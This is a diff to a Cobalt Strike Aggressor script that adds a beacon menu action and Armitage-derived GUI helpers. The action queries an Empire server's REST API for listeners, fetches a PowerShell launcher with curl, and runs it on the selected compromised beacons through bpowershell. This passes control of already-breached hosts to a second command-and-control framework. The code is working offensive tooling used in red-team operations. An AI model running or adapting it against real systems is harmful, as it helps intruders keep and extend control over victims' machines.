@@ -1,9 +1,16 @@
 #author bluescreenofjeff
 
-# thanks to @armitagehacker and @harmj0y
+# Big thanks to @armitagehacker and @harmj0y
 
-#Set the Empire server IP, port, and REST token Below
+#Set the Empire server IP, port, and REST token below on lines 20-22
 #Name your listeners without spaces!
+
+# needed imports for custom menu creation
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
 
 
 popup beacon_bottom {
@@ -14,7 +21,7 @@ popup beacon_bottom {
 
 		$server_ip = "127.0.0.1";
 		$server_port = "1337";
-		$rest_token = "TOKEN-GOES-HERE";
+		$rest_token = "EMPIRE REST TOKEN GOES HERE";
 
 		########################################
 
@@ -39,20 +46,28 @@ popup beacon_bottom {
 			throw "[!] Error - No listeners retrieved from Empire at $server_ip port $server_port";
 		}
 
-		#prompt for Empire listener choice
-		$listener_string = replace(join(', ', @listener_names),", ", "\n   ");
-		prompt_text("Choose a listener: \n   $listener_string", @listener_names[0], lambda({
-			
-			#throw error if no listener names found
-			if (" " isin $1){
-				show_message("[!] Error - Listeners with spaces in the name are not supported");
-				throw "[!] Error - Listeners with spaces in the name are not supported";
+		#make listener name hashlist
+		@listener_list = @();
+		foreach $name (@listener_names){
+			add(@listener_list,%(listener => "$name" ));
+		};
 
-			}
+		#prompt for Empire listener choice
+		quickListDialog("Chose an Empire listener", "Select", @("listener", "listener"), @listener_list, $width => 350, $height => 240, lambda({
+			#lambda function runs following code with selected listener as $1
+
+			#throw error if no listener names found
+			# if (" " isin $1){
+			# 	show_message("[!] Error - Listeners with spaces in the name are not supported");
+			# 	throw "[!] Error - Listeners with spaces in the name are not supported";
+
+			# }
+
+			$chosen_listener = replace($1, " ", "");
 
 			#curl Empire for chosen listener's launcher
 
-			$cmd = 'curl --insecure -i -H Content-Type:application/json https://' . $server_ip . ':' . $server_port . '/api/stagers?token=' . $rest_token . ' -X POST -d {"StagerName":"launcher","Listener":"' . $1 . '"} ';
+			$cmd = 'curl --insecure -i -H Content-Type:application/json https://' . $server_ip . ':' . $server_port . '/api/stagers?token=' . $rest_token . ' -X POST -d {"StagerName":"launcher","Listener":"' . $chosen_listener . '"} ';
 
 			$curl_stager = exec($cmd);
 
@@ -70,9 +85,14 @@ popup beacon_bottom {
 
 			#issue launcher on all selected beacons
 			binput(@ids, "powershell $posh");
-			bpowershell(@ids, "$posh");
+			bpowershell(@ids, "$posh");        	
 
-		}, @ids => $1));
+    	},@ids => $1), \$tablef);
+
+		# $listener_string = replace(join(', ', @listener_names),", ", "\n   ");
+		# prompt_text("Choose a listener: \n   $listener_string", @listener_names[0], lambda({
+			# BLAH
+		# }, @ids => $1));
 
 		#clear the arrays out
 		clear(@listeners);
@@ -82,3 +102,128 @@ popup beacon_bottom {
 
 	}
 }
+
+
+###################################################
+#
+# GUI Helper Methods
+#   these are all from armitage/scripts/gui.sl
+#
+###################################################
+
+# creates a list dialog, from armitage/scripts/gui.sl
+# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
+
+# creates a list dialog,
+# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
+sub quickListDialog {
+	local('$dialog $panel $table $row $model $button $sorter $after $a $tablef');
+	$dialog = dialog($1, $width, $height);
+	$panel = [new JPanel];
+	[$panel setLayout: [new BorderLayout]];
+	
+	($table, $model) = setupTable($3[0], sublist($3, 1), $4);
+	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
+
+	if ($tablef !is $null) {
+		[$tablef: $table, $model];
+	}
+	
+	$button = [new JButton: $2];
+	[$button addActionListener: lambda({
+		[$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model]; 
+		[$dialog setVisible: 0];
+	}, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];
+
+	local('$south');
+	$south = [new JPanel];
+        [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+	if ($after !is $null) {
+		foreach $a ($after) {
+			[$south add: $a];
+		}
+	}
+	[$south add: center($button)];
+
+	[$panel add: $south, [BorderLayout SOUTH]];
+	[$dialog add: $panel, [BorderLayout CENTER]];
+	[$dialog show];
+	[$dialog setVisible: 1];
+}
+
+
+# ($table, $model) = setupTable("lead", @rows)
+sub setupTable {
+	local('$table $model $sorter $row $index $col');
+	$model = [new GenericTableModel: $2, $1, 8];
+	foreach $row ($3) {
+		[$model _addEntry: $row];
+        }
+
+	$table = [new ATable: $model];
+	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+	$sorter = [new TableRowSorter: $model];
+	[$table setRowSorter: $sorter];
+
+	# make sure our columns have sorters that make sense
+	foreach $index => $col ($2) {
+		if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
+			[$sorter setComparator: $index, &compareHosts];
+		}
+		else if ($col eq "port" || $col eq "sid" || $col eq "Port") {
+			[$sorter setComparator: $index, { return $1 <=> $2; }];
+		}
+	}
+	
+	return @($table, $model);
+}
+
+# from armitage/scripts/gui.sl
+sub center {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub left {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub syncTable {
+    if ([$1 isEditing]) {
+        [[$1 getCellEditor] stopCellEditing];
+    }
+}
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+    local('$dialog');
+        $dialog = [new JDialog: $__frame__, $1];
+        [$dialog setSize: $2, $3];
+        [$dialog setLayout: [new BorderLayout]];
+        [$dialog setLocationRelativeTo: $__frame__];
+    return $dialog;
+}
+
+# helpers, from armitage/scripts/gui.sl
+sub tableRenderer {
+    return [ATable getDefaultTableRenderer: $1, $2];
+}
+
